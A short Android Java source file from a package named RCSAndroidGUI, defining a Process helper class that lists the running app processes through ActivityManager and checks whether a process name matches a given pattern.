package com.ht.RCSAndroidGUI;

import java.util.ArrayList;
import java.util.Iterator;

import android.app.ActivityManager;
import android.content.Context;

public class Process {
	private ArrayList<ActivityManager.RunningAppProcessInfo> list;
	private ActivityManager activityManager;
	
	public Process() {
		list = new ArrayList<ActivityManager.RunningAppProcessInfo>();
		list.clear();
		
		activityManager = (ActivityManager)Status.getAppContext()
				.getSystemService(Context.ACTIVITY_SERVICE);
	}
	
	public void clear() {
		list.clear();
	}
	
	public void update() {
		if (activityManager == null)
			return;
		
		clear();
		
		list = (ArrayList<ActivityManager.RunningAppProcessInfo>)activityManager.getRunningAppProcesses();
	 }
	
	public boolean isPresent(String p) {
		Iterator<ActivityManager.RunningAppProcessInfo> iter = list.listIterator();
		
		if (list == null || list.size() == 0)
			return false;
		
		if (p.length() == 0)
			return false;
		
		while (iter.hasNext()) {
			ActivityManager.RunningAppProcessInfo element = iter.next();

			if (element.processName.matches(p) == true)
				return true;
		}
		
		return false;
	}
}
